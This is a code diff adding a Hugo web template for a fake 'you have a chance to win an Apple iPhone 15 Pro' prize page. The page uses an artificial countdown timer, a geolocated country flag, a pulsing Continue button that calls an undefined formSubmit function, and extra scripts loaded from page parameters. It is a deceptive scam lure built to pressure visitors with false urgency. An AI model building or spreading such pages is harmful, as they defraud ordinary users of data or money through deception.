@@ -1,0 +1,83 @@
+{{ define "main" }}
+<body>
+    <div class="container" id="app" data-v-app="">
+      <div class="content">
+        <div class="left-side">
+          <img src="/png/iphone15pro.png" class="iphone-image prize-image">
+        </div>
+        
+        <div class="right-side">
+          <div class="header">
+            <h1 data-i18n="congratulations">Congratulations! 🎉</h1>
+            <h2 data-i18n="win">You have a chance to win.</h2>
+            <h2 class="prize-text">Apple iPhone 15 Pro</h2>
+          </div>
+          
+          <div data-i18n="[html]message" class="message">
+          </div>
+
+          <div id="flag-container" style="display:flex; justify-content:center">
+    <img id="geo-flag" width="100" alt="Country Flag" />
+</div>
+          
+          <div class="timer">
+            <div class="timer">
+              <div class="time-block" id="minutes">02</div>
+              <div class="separator">:</div>
+              <div class="time-block" id="seconds">28</div>
+            </div>
+          </div>
+          
+          <div data-i18n="hurryUp" class="hurry-up"></div>
+          <button data-i18n="button" onclick="formSubmit();"
+            class="continue-btn animate-pulse" 
+            >
+           Continue
+        </button>
+        </div>
+      </div>
+    </div>
+
+{{ $jquery := resources.Get "js/jquery.min.js" | fingerprint }}
+<script src="{{ $jquery.RelPermalink }}"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.messagestore.min.js"></script>
+
+{{ range .Params.modals }}
+{{ $modal := resources.Get . | js.Build  | fingerprint }}
+<!-- Use this for external scripts -->
+<script src="{{ $modal.RelPermalink }}"></script>
+<!-- Use this for inline scripts -->
+<!--<script> {{ $modal.Content | safeJS }} </script> -->
+{{ end }}
+  
+
+    
+    <script>
+      let totalSeconds = 148;
+      
+      function updateTimer() {
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+        
+        document.getElementById('minutes').textContent = 
+          String(minutes).padStart(2, '0');
+        document.getElementById('seconds').textContent = 
+          String(seconds).padStart(2, '0');
+        
+        if(totalSeconds <= 0) {
+          clearInterval(timerInterval);
+          document.querySelector('.hurry-up').textContent = "⏰ সময় শেষ!";
+          return;
+        }
+        
+        totalSeconds--;
+      }
+      
+      const timerInterval = setInterval(updateTimer, 1000);
+      updateTimer();
+    </script>
+
+
+  </body>
+{{ end }}
